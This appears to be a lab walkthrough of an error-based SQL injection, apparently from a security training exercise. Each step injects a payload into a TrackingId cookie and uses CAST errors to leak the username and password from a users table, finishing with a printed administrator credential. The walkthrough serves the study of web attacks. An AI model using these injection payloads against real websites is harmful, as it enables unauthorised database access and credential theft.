### We notice ```Cookie: TrackingId=ebVJ3SqBjZlzaJ5h;``` this param is vulnerable and inject following payload:

```
Cookie: TrackingId=SuNnJlVwVNjaigCn';
```

![image](https://github.com/user-attachments/assets/c007269c-419e-4669-a4c4-7b67fcc5fe3d)

### ```error message``` printed.

### Try  following payload:

```
Cookie: TrackingId=SuNnJlVwVNjaigCn'--;
```

### ```200 states``` printed so This is ```true```.

#### We know that there is one table is ```users``` and there are two columns ```username```,```password``` and there username is ```administrator``` and require his password.

### Ok We change value from string to integer:

```
Cookie: TrackingId=c4tf65BJedISgLpl' AND 1=CAST((SELECT 1) AS int)--;
```

### error because ```AND``` must be boolean.


### Ok we will change payload and add  ```=``` to know type of database:


```
Cookie: TrackingId=c4tf65BJedISgLpl' AND CAST((SELECT 1) AS int)--;
```

### 200 status 


### retrieve data from username in users table
```
Cookie: TrackingId=c4tf65BJedISgLpl' AND 1=CAST((SELECT username FROM users) AS int)--;
```

![image](https://github.com/user-attachments/assets/7551ef2a-39a5-485f-8e65-905590c93c0e)

### Let's go delete TrackingId value and try again:

```
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--;
```

![image](https://github.com/user-attachments/assets/a8d06f7d-b819-4909-89c7-d051ff72415f)

### Now add ```Limit 1``` such as:

```
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--;
```

![image](https://github.com/user-attachments/assets/6c202ef7-330b-4191-ab4c-78dbeec84e34)

### Ok Now we discover username let's go discover password:

```
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--;
```

![image](https://github.com/user-attachments/assets/f5c6e5da-df27-4f02-9c02-689261abd104)

#### this is password ```administrator:rz8u2e6300his0jlg72z```
